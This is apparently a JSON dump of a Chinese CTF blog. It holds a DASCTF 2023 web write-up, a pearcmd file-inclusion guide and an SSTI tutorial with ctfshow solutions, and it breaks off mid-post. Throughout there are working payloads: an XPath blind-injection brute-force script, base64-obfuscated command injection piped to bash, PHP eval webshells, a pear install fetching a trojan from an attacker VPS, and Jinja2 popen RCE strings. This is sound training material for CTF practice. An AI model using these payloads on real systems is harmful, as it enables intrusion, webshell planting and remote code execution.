{"posts":[{"title":"Hello World","text":"2024/1/23 博客正在更换主题中，将在半个月内完成更新 之前的kaze主题bug太多 换成了这个新主题","link":"/2024/01/23/hello-world/"},{"title":"DASCTF 2023 &amp; 0X401七月暑期挑战赛","text":"DASCTF 2023 &amp; 0X401七月暑期挑战赛EzFlask考点：Python原型链污染，目录穿越，文件读取，Pin码计算 原型链污染参考链接 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import uuidfrom flask import Flask, request, sessionfrom secret import black_listimport jsonapp = Flask(__name__)app.secret_key = str(uuid.uuid4())def check(data): for i in black_list: if i in data: return False return Truedef merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class user(): def __init__(self): self.username = &quot;&quot; self.password = &quot;&quot; pass def check(self, data): if self.username == data['username'] and self.password == data['password']: return True return FalseUsers = []@app.route('/register',methods=['POST'])def register(): if request.data: try: if not check(request.data): return &quot;Register Failed&quot; data = json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;Register Failed&quot; User = user() merge(data, User) Users.append(User) except Exception: return &quot;Register Failed&quot; return &quot;Register Success&quot; else: return &quot;Register Failed&quot;@app.route('/login',methods=['POST'])def login(): if request.data: try: data = json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;Login Failed&quot; for user in Users: if user.check(data): session[&quot;username&quot;] = data[&quot;username&quot;] return &quot;Login Success&quot; except Exception: return &quot;Login Failed&quot; return &quot;Login Failed&quot;@app.route('/',methods=['GET'])def index(): return open(__file__, &quot;r&quot;).read() #存在任意文件读取, 这里也暗示了可以污染__file__实现任意文件读取if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=5010) 题目源代码，merge()函数暗示了可能存在原型链污染的漏洞。 123456789101112# 合并两个字典def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): # 检查dst是否支持索引操作 if dst.get(k) and type(v) == dict: # 如果dst中已存在键k，并且对应的值非空且为字典类型 merge(v, dst.get(k)) # 递归地将v合并到dst[k]中 else: dst[k] = v # 将src中的键值对直接赋值给dst elif hasattr(dst, k) and type(v) == dict: # 检查dst是否具有名为k的属性，并且对应的值非空且为字典类型 merge(v, getattr(dst, k)) # 递归地将v合并到dst.k中 else: setattr(dst, k, v) # 将src中的键值对作为名为k的属性添加到dst中 这个函数的功能是把src字典合并到dst字典中，如果dst列表中已经存在[k, v]键值对，则覆盖原键值对。如果dst列表中不存在[k, v]键值对，则创建新的[k, v]键值对。递归用于处理json中嵌套的对象 e.g. 12345678910111213141516171819202122232425//dst{ &quot;Father&quot;: &quot;Ava&quot;, &quot;Mother&quot;:{ &quot;name&quot;: &quot;Diana&quot;, }}//src{ &quot;Father&quot;: &quot;Ava&quot;, &quot;Mother&quot;:{ &quot;name&quot;: &quot;Diana&quot;, &quot;gender&quot;: &quot;female&quot; } &quot;Son&quot;: &quot;Acao&quot;}//合并后的字典dst{ &quot;Father&quot;: &quot;Ava&quot;, &quot;Mother&quot;:{ &quot;name&quot;: &quot;Diana&quot;, &quot;gender&quot;: &quot;female&quot; } &quot;Son&quot;: &quot;Acao&quot;} 而Python存在许多内置属性，例如__globals__，__class__，__base__等等。可以形成链子，污染无继承的类属性甚至全局变量。 以下是两种污染方法 _static_folder属性这个属性中存放的是flask中静态目录的值，默认该值为./static，如果污染该值，则可通过/static实现目录穿越。 访问flask下的静态资源的url为http://127.0.0.1/static/test，这实际上访问了test资源并返回，如果把该属性污染为/，也就是根目录。 那么http://127.0.0.1/static/etc/passwd等同于于http://127.0.0.1/etc/passwd，因此可以访问根目录下的文件。 原型链污染出动，Post访问/register路由注册用户 123456789101112//Payload unicode编码绕过，不编码绕过可能会出现register failed的错误{ &quot;username&quot;:&quot;D1anash1ba&quot;, &quot;password&quot;:&quot;AvaDiana&quot;, &quot;__init_\\u005f&quot;:{ &quot;__globals__&quot;:{ &quot;app&quot;:{ &quot;_static_folder&quot;:&quot;/&quot; } } }} __file__属性123456789{ &quot;username&quot;:&quot;D1anash1ba&quot;, &quot;password&quot;:&quot;AvaDiana&quot;, &quot;__init_\\u005f&quot;:{ &quot;__globals__&quot;:{ &quot;__file__&quot;:&quot;/etc/passwd&quot; } }} __file__属性是python自带的属性，审计源码可以发现网站根目录有read()函数 解题步骤接下来就是读取文件，进行Pin码计算。 访问/static/etc/passwd，/static/sys/class/net/eth0/address，/etc/machine-id，/proc/self/cgroup。 这里有一个小坑，想要获取文件路径，只能使用第二种污染方法，通过污染__file__使得read()函数报错，从而获取路径。或者也可以直接猜测路径，更改以下python版本号试试。 最后计算出Pin码，进入/console，读取flag 非预期解读取/proc/1/environment，发现Flag在环境变量中。很多出题者会忘记这一点。 MyPicDisk考点：XXE盲注，命令执行 || Phar反序列化，命令执行 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117&lt;?phpsession_start();error_reporting(0);class FILE{ public $filename; public $lasttime; public $size; public function __construct($filename){ if (preg_match(&quot;/\\//i&quot;, $filename)){ throw new Error(&quot;hacker!&quot;); } $num = substr_count($filename, &quot;.&quot;); if ($num != 1){ throw new Error(&quot;hacker!&quot;); } if (!is_file($filename)){ throw new Error(&quot;???&quot;); } $this-&gt;filename = $filename; $this-&gt;size = filesize($filename); $this-&gt;lasttime = filemtime($filename); } public function remove(){ unlink($this-&gt;filename); } public function show() { echo &quot;Filename: &quot;. $this-&gt;filename. &quot; Last Modified Time: &quot;.$this-&gt;lasttime. &quot; Filesize: &quot;.$this-&gt;size.&quot;&lt;br&gt;&quot;; } public function __destruct(){ system(&quot;ls -all &quot;.$this-&gt;filename); }}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;MyPicDisk&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?phpif (!isset($_SESSION['user'])){ echo '&lt;form method=&quot;POST&quot;&gt; username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt; password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;&lt;/form&gt;'; $xml = simplexml_load_file('/tmp/secret.xml'); if($_POST['submit']){ $username=$_POST['username']; $password=md5($_POST['password']); $x_query=&quot;/accounts/user[username='{$username}' and password='{$password}']&quot;; $result = $xml-&gt;xpath($x_query); if(count($result)==0){ echo '登录失败'; }else{ $_SESSION['user'] = $username; echo &quot;&lt;script&gt;alert('登录成功!');location.href='/index.php';&lt;/script&gt;&quot;; } }}else{ if ($_SESSION['user'] !== 'admin') { echo &quot;&lt;script&gt;alert('you are not admin!!!!!');&lt;/script&gt;&quot;; unset($_SESSION['user']); echo &quot;&lt;script&gt;location.href='/index.php';&lt;/script&gt;&quot;; } echo &quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;; if (!$_GET['file']) { foreach (scandir(&quot;.&quot;) as $filename) { if (preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) { echo &quot;&lt;a href='index.php/?file=&quot; . $filename . &quot;'&gt;&quot; . $filename . &quot;&lt;/a&gt;&lt;br&gt;&quot;; } } echo ' &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; 选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt; '; if ($_FILES['file']) { $filename = $_FILES['file']['name']; if (!preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) { die(&quot;hacker!&quot;); } if (move_uploaded_file($_FILES['file']['tmp_name'], $filename)) { echo &quot;&lt;script&gt;alert('图片上传成功!');location.href='/index.php';&lt;/script&gt;&quot;; } else { die('failed'); } } } else{ $filename = $_GET['file']; if ($_GET['todo'] === &quot;md5&quot;){ echo md5_file($filename); } else { $file = new FILE($filename); if ($_GET['todo'] !== &quot;remove&quot; &amp;&amp; $_GET['todo'] !== &quot;show&quot;) { echo &quot;&lt;img src='../&quot; . $filename . &quot;'&gt;&lt;br&gt;&quot;; echo &quot;&lt;a href='../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=remove'&gt;remove&lt;/a&gt;&lt;br&gt;&quot;; echo &quot;&lt;a href='../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=show'&gt;show&lt;/a&gt;&lt;br&gt;&quot;; } else if ($_GET['todo'] === &quot;remove&quot;) { $file-&gt;remove(); echo &quot;&lt;script&gt;alert('图片已删除!');location.href='/index.php';&lt;/script&gt;&quot;; } else if ($_GET['todo'] === &quot;show&quot;) { $file-&gt;show(); } } }}?&gt;&lt;/body&gt;&lt;/html&gt; 解题步骤（XXE盲注）看到输入框，先尝试admin弱口令，发现输入admin'可以继续跟进，发现/y0u_cant_find_1t.zip路由，获取源代码。 万用密码username=a' or 1 or '1&amp;password=a 1234567891011121314// XML查询数据$xml = simplexml_load_file('/tmp/secret.xml'); if($_POST['submit']){ $username=$_POST['username']; $password=md5($_POST['password']); $x_query=&quot;/accounts/user[username='{$username}' and password='{$password}']&quot;; $result = $xml-&gt;xpath($x_query); if(count($result)==0){ echo '登录失败'; }else{ $_SESSION['user'] = $username; echo &quot;&lt;script&gt;alert('登录成功!');location.href='/index.php';&lt;/script&gt;&quot;; }} 这段代码可以看到，username和password都存储在/tmp/secret.xml中，因此需要使用XXE盲注获取admin的密码。只有登陆了admin的账号才可以进行文件上传。 1234567891011121314151617181920212223242526272829import requestsimport timeurl = &quot;http://419a2e70-da77-4fdf-a56c-7a4b096b8645.node4.buuoj.cn:81/index.php&quot;dicts = '0123456789abcdefghijklmnopqrstuvwxyz' #md5加密结果没有大写字母, 如果需要爆破路径则加上A-Zans = ''#XPath的函数是从1开始计数的, 例如substring()for i in range(1, 100): for j in dicts: #本题知道xml的结构, 也知道用户名是admin, 所以只需要盲注猜测密码即可。 #注意单引号的闭合,最后的查询语句如下所示 #&quot;/accounts/user[username='&lt;username&gt;'or substring(/accounts/user[1]/password/text(), {}, 1)='{}' or ''='' and password='{$password}']&quot;; payload_password = &quot;&lt;username&gt;' or substring(/accounts/user[1]/password/text(), {}, 1) = '{}' or ''='&quot;.format(i, j) data = { &quot;username&quot;:payload_password, #username可控 &quot;password&quot;:&quot;Ava&quot;, &quot;submit&quot;:&quot;Diana&quot; } #print(payload_password) time.sleep(0.1) #防止请求过快 res = requests.post(url=url, data=data) #print(res.text) if &quot;登录成功!&quot; in res.text: ans += j print(ans) break if '登录失败' in res.text: breakprint(ans)print(&quot;End!&quot;) 最后得到md5加密后的密码003d7628772d6b57fec5f30ccbc82be1，解密得到原密码15035371139 登录后就是一个网盘系统，可以上传文件，重点关注一下代码，命令拼接可以rce。 123public function __destruct(){ system(&quot;ls -all &quot;.$this-&gt;filename);} 拼接命令注入，payload：;echo bHMgLwo|base64 -d|bash;123.jpg。这条payload将base64加密后的ls /交给base64 -d命令执行，解密后的结果作为输入给bash执行。注意使用;分隔不同的命令。 访问超链接即可执行命令(源代码自定义了一个FILE类，需要访问来创建这个类的实例，并在最后自动回收触发__destruct__()函数才能rce) 得到flag文件名adjaskdhnask_flag_is_here_dakjdnmsakjnfksd，修改命令再次发包。 payload：;echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;123.jpg 解题步骤（Phar反序列化漏洞）123456789101112131415161718192021222324&lt;?phpclass FILE{ public $filename=&quot;;echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash -i&gt;4.txt&quot;; public $lasttime; public $size; public function remove(){ unlink($this-&gt;filename); } public function show() { echo &quot;Filename: &quot;. $this-&gt;filename. &quot; Last Modified Time: &quot;.$this-&gt;lasttime. &quot; Filesize: &quot;.$this-&gt;size.&quot;&lt;br&gt;&quot;; }}#获取phar包 固定流程$phar = new Phar(&quot;abc.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new FILE();$phar-&gt;setMetadata($o); //自定义meta-data$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; ez_cms考点：文件包含，pearcmd写WebShell pearcmd的利用标准格式payload 1?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/shell.php 不过并不是所有pear都在上述payload路径下，例如本题就在/usr/share下 1/admin/index.php?+config-create+/&amp;r=../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[cmd]);&gt;+../../../../../../../../tmp/shell.php burpsuite发包写webshell，蚁剑连接 1http://024706da-30e8-418a-9871-0d5628438b6e.node4.buuoj.cn:81//admin/index.php?r=../../../../../../../../tmp/shell 在根目录下找到flag ez_pysession pickle反序列化 一坨 复现不了","link":"/2023/11/25/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/"},{"title":"Pearcmd文件包含","text":"Pearcmd文件包含总结一下pearcmd文件包含的利用方法，如果碰到PHP+文件包含可以往这个方向尝试一下 利用条件 安装了pear扩展 php开启了register_argc_argv选项 Docker会默认安装pear扩展，也会自动开启register_argc_argv选项 原理pear扩展是一个php下的命令行扩展管理工具，默认的安装路径是/usr/local/lib/php/pearcmd.php，在命令行下可以直接使用pear或者php /usr/local/lib/php/pearcmd.php运行，如果存在文件包含漏洞，则可以利用这个命令行工具 如果打开register_argc_argv这个选项的话，URL中?后面的内容会全部传入至$_SERVER['argv']这个变量内 ，无论参数中是否存在等号 pear扩展在pearcmd.php中会获取命令行参数 123456789PEAR_Command::setFrontendType('CLI');$all_commands = PEAR_Command::getCommands();$argv = Console_Getopt::readPHPArgv();// fix CGI sapi oddity - the -- in pear.bat/pear is not removedif (php_sapi_name() != 'cli' &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == '--') { unset($argv[1]); $argv = array_values($argv);} 这里调用了readPHPArgv()函数获取命令行参数 123456789101112131415public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } readPHPArgv()函数从$argv、$_SERVER['argv']、$GLOBALS['HTTP_SERVER_VARS']['argv']等获取变量，而$_SERVER['argv']是可控的变量。因此，可以利用pear获取通过GET方式上传的变量。 利用使用**php:7.4-apache**这个官方镜像做测试 寻找可用的pear命令 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253Commands:build Build an Extension From C Sourcebundle Unpacks a Pecl Packagechannel-add Add a Channelchannel-alias Specify an alias to a channel namechannel-delete Remove a Channel From the Listchannel-discover Initialize a Channel from its serverchannel-info Retrieve Information on a Channelchannel-login Connects and authenticates to remote channel serverchannel-logout Logs out from the remote channel serverchannel-update Update an Existing Channelclear-cache Clear Web Services Cacheconfig-create Create a Default configuration fileconfig-get Show One Settingconfig-help Show Information About Settingconfig-set Change Settingconfig-show Show All Settingsconvert Convert a package.xml 1.0 to package.xml 2.0 formatcvsdiff Run a &quot;cvs diff&quot; for all files in a packagecvstag Set CVS Release Tagdownload Download Packagedownload-all Downloads each available package from the default channelinfo Display information about a packageinstall Install Packagelist List Installed Packages In The Default Channellist-all List All Packageslist-channels List Available Channelslist-files List Files In Installed Packagelist-upgrades List Available Upgradeslogin Connects and authenticates to remote server [Deprecated in favor of channel-login]logout Logs out from the remote server [Deprecated in favor of channel-logout]makerpm Builds an RPM spec file from a PEAR packagepackage Build Packagepackage-dependencies Show package dependenciespackage-validate Validate Package Consistencypickle Build PECL Packageremote-info Information About Remote Packagesremote-list List Remote Packagesrun-scripts Run Post-Install Scripts bundled with a packagerun-tests Run Regression Testssearch Search remote package databaseshell-test Shell Script Testsign Sign a package distribution filesvntag Set SVN Release Taguninstall Un-install Packageupdate-channels Update the Channel Listupgrade Upgrade Packageupgrade-all Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]Usage: pear [options] command [command-options] &lt;parameters&gt;Type &quot;pear help options&quot; to list all options.Type &quot;pear help shortcuts&quot; to list all command shortcuts.Type &quot;pear help version&quot; or &quot;pear version&quot; to list version information.Type &quot;pear help &lt;command&gt;&quot; to get the help for the specified command. 有两种利用方法 config-create这个命令需要两个参数 1pear config-create /Diana /tmp/test.txt 第一个参数会被写入第二个参数所创建的文件中，我们可以利用这点写入PHP木马，然后利用文件包含漏洞包含木马文件即可 1?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/shell.php 写一个木马即可，然后连接Webshell 1http://127.0.0.1/?file=/tmp/shell.php install这个命令会尝试下载文件，可以在自己的vps上挂一个木马 1pear install http://[vps]:[port]/muma1.php 在/tmp/pear/download/目录下有一个muma1.php 修改payload，使用--installroot指定下载目录 1?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/muma1.php 就可以实现传马了，文件目录是&amp;file=/usr/local/lib/php/pearcmd.php\\&amp;/tmp/pear/download/muma1.php","link":"/2024/01/05/Pearcmd%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"title":"ctfshow-SSTI","text":"SSTI模板注入参考文档SSTI进阶：https://blog.csdn.net/miuzzx/article/details/110220425 SSTI入门SSTI，服务端模板注入，其实也就是模板引擎+注入，那么我们首先需要了解一下模板引擎。 模板只是一种提供给程序来解析的一种语法，通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将塞进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。 常见的模板引擎如下 123PHP: Smarty, Twig, BladeJAVA: JSP, FreeMarker, VelocityPython: Jinja2, django, tornado Flask框架Flask框架使用的模板是Jinja2，在给出模板渲染代码之前，我们先在本地构造一个html界面作为模板，也就是模板渲染代码的相同位置下，有一个名templates的文件夹，在里面写入一个index.html文件，内容如下： 123456789&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SSTI&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Hello,{{name}}!&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; \"{{}}\"中的name即为需要渲染的变量，此时我们写我们的模板渲染代码(app.py)，内容如下： 1234567from flask import *app = Flask(__name__)def index(): query = request.args.get(&quot;name&quot;) return render_template('index.html', name = query)if __name__ == &quot;__main__&quot;: app.run(port = 1211, debug=True) Get方式提交参数?name=Diana运行即可 SSTI成因如果程序员偷懒，把两个文件合并到一个文件中，就会导致SSTI注入漏洞 12345678910111213141516171819from flask import Flask,request,render_template_stringapp = Flask(__name__)@app.route('/', methods=['GET', 'POST'])def index(): name = request.args.get('name') template = '''&lt;html&gt; &lt;head&gt; &lt;title&gt;SSTI&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;Hello, %s !&lt;/h3&gt; &lt;/body&gt;&lt;/html&gt; '''% (name) return render_template_string(template)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 此时如果传入?name=21则会出现 这是因为\"{{}}\"包裹的内容会被渲染，3*7被当作了一个python表达式进行计算，计算的结果被格式化输出到%s处，最后导致显示结果为Hello，21！ Python语法知识SSTI中可能用到的语法知识下划线包裹的是魔术方法 12345678910111213141516171819202122232425262728__class__ 查看对象所在的类__mro__ 查看继承关系和调用顺序，返回元组__base__ 返回基类__bases__ 返回基类元组(Tuple)__subclasses__() 返回子类列表(List)__init__ 调用初始化函数，可以用来跳到__globals____globals__ 返回函数所在的全局命名空间所定义的全局变量，返回字典__builtins__ 返回内建内建名称空间字典__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_appget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_applipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}{{cycler.__init__.__globals__.os.popen('ls').read()}}current_app 应用上下文，一个全局变量request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取ope函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read() }} Jinja2一些语句\"{%%}\"可以用来声明变量，也可以用于循环语句和条件语句 12345678910111213141516&lt;!---test.html---&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; 条件语句和循环语句&lt;/head&gt;&lt;body&gt; {% for i in ['Ava', 'Bella', 'Diana', 'Elieen'] %} {% if i in user %} &lt;h3&gt;Hello, {{i}}!&lt;/h3&gt; {% else %} &lt;h3&gt;There is no user '{{i}}'&lt;/h3&gt; {% endif %} {% endfor %}&lt;/body&gt;&lt;/html&gt; 123456789# app.pyfrom flask import Flask,render_templateapp = Flask(__name__)@app.route('/', methods=['GET', 'POST'])def test(): user = [&quot;Ava&quot;, &quot;Diana&quot;] return render_template('test.html', user = user)if __name__ == &quot;__main__&quot;: app.run(port=1211, debug=True) 一些可能会用到的函数1234567891011121314151617181920212223length():获取一个序列或者字典的长度并将其返回int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；reverse()：反转字符串；replace(value,old,new)： 将value中的old替换为newlist()：将变量转换为列表类型；string()：将变量转换成字符串类型；join()：将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用attr(): 获取对象的属性关于attr:官方解释：foo|attr(&quot;bar&quot;) 等效于 foo[&quot;bar&quot;] 管道符号可以参考官方文档：https://jinja.palletsprojects.com/en/3.0.x/templates/#filters Payload构造第一步：查找基类 12&quot;&quot;.__class__.__mro__[-1]# 直到出现&lt;class 'object'&gt; 第二步：查找基类的子类 12{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()}}# 此时会出现大量子类 os._wrap_close类大多数情况下，我们会利用&lt;class os._wrap_close&gt;这个类 可以用以下脚本来查找下标，具体视情况更改脚本内容 123456789import requestsheaders = { 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'}for i in range(500): url = &quot;http://127.0.0.1:5000/?name=\\ {{().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]}}&quot; res = requests.get(url=url, headers=headers) if 'os._wrap_close' in res.text: print(i) 接下来我们利用&lt;class os._wrap_close&gt;这个类中的popen方法。 调用__init__方法初始化类 1{{&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__}} 然后使用__global__方法获取以字典形式返回的方法和属性 1{{&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cmd').read()}} cmd即为需要执行的命令，实现rce。 popen:https://blog.csdn.net/Z_Stand/article/details/89375589 __builtins__模块还有一个常用的模块就是__builtins__,它里面有eval() open()等函数，我们可以也利用它来进行RCE 它的payload是 12{{url_for.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cmd').read()&quot;)}}{{x.__init__.__globals__.__builtins__.eval(request.cookies.a)}} 读取文件的payload1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %} 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cmd').read()&quot;)}}{% endif %}{% endfor %} SSTI常见的绕过方式绕过.12345671.用[]代替.{{&quot;&quot;.__class__}} 等价于 {{&quot;&quot;['__class__']}}2.用attr()过滤器代替{{&quot;&quot;.__class__}} 等价于 {{&quot;&quot;|attr('__class__')}}#关于attr:#官方解释：foo|attr(&quot;bar&quot;) 等效于 foo[&quot;bar&quot;] # lipsum | attr('__globals__') 等价于 lipsum.__globals__ 绕过[]可以使用__getitem__方法，用()代替[] 123__bases__[0] 等价于 __bases__.__getitem__(0)# 利用下面payload可以避免使用中括号{{.__init__.__globals__.__builtins__.eval(request.cookies.a)}} 绕过_123451、通过list获取字符列表，然后用pop来获取_，举个例子{% set a=(()|select|string|list).pop(24)%}{%print(a)%}下划线的ascii码是24, 把24换成其他数字就可以构造其他字符2、十六进制编码进行绕过，举个例子{{()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;]}} = {{().__class__}} 绕过\"{{}}\"有时候为了防止SSTI，可能程序员会ban掉\"{{}}\"，这个时候我们可以利用jinja2的语法，用\"{%%}\"来进行RCE。 1{%print(&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('dir').read())%} for循环配合if语句 1{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print (i.__init__.__globals__['popen']('dir').read())%}{%endif%}{%endfor%} 绕过''和&quot;&quot;利用request.args.a传入参数绕过 1{{url_for.__globals__[request.args.a]}}&amp;a=__builtins__ 等价于 {{url_for.__globals__['__builtins__']}} 绕过args如果args也被过滤了，那我们就利用requests.cookies和requests.values 1Get传参 {{url_for.__globals__[request.cookies.a]}} 然后打开F12修改 Cookie: &quot;a&quot; :__builtins__ 绕过数字利用过滤器和管道符号绕过 官方文档：https://jinja.palletsprojects.com/en/3.0.x/templates/#filters 12{{(dict(a=1,b=1,c=1)|join|count)}} 等价于 {{3}}原理：count(&quot;&quot;.join({a:1, b:1, c:1})) 字典中变量个数就是需要构造的数字个数，原理是通过join()函数把字典变成字符串，然后用count()函数统计字符串长度 绕过关键字有时候class，base等关键词也会被过滤，我们同样可以通过join()函数拼接绕过 1{{dict(__in=a,it__=a)|join} 等价于 __init__ 另外也可以使用~连接字符，~是jinja2中的连接符,可以连接变量和字符 1{{&quot;__in&quot;~&quot;it__&quot;}} 等价于 __init__ unicode编码绕过CTF show SSTI刷题Web361没有任何过滤 1?name={{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}} Web362过滤了数字2和3 第一种payload 直接构造数字，利用乘法得到132（一般os._wrap._close类都在132） 1?name={{&quot;&quot;.__class__.__base__.__subclasses__()[(dict(a=1,b=1)|join|count)*66].__init__.__globals__['popen']('cat /flag').read()}} 第二种payload 过滤器，先把变量b赋值为2 1?name={%set b=(dict(b=c,c=d)|join|count)%}{{''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()}} 第三种payload 利用__builtins__模块，x可以是任意字母 1?name={{x.__init__.__globals__['__builtins__'].eval('__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()')}} Web363过滤了单引号和双引号 利用os._wrap_close 1?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}&amp;a=popen&amp;b=cat /f* 利用__builtins__ 1?name={{x.__init__.__globals__[request.args.a].eval(request.args.b)}}&amp;a=__builtins__&amp;b=__import__('os').popen('cat /f*').read() Web364过滤了单引号，双引号以及args 那就利用cookies 1?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.a](request.cookies.b).read()}} 打开f12修改cookies。a:popen, b:cat /f* Web365在上一题的基础上过滤了中括号 1?name={{x.__init__.__globals__.__getitem__(request.values.b).eval(request.values.a)}}&amp;b=__builtins__&amp;a=__import__('os').popen('tac /flag').read() 参数逃逸，也可以修改cookies Web366开始过滤下划线，我们可以开始使用attr()过滤器进行绕过 attr()过滤器的用法 123foo | attr('bar') 等价于 foo['bar']而foo['bar']和foo.bar在jinja2下又是等价的lipsum | attr('__globals__') 等价于 lipsum.__globals__ 还是要多读文档，这两个东西是等价的 12?name={{(lipsum|attr(request.values.a)).os.popen(request.values.b).read()}}&amp;a=__globals__&amp;b=cat /flag等同于 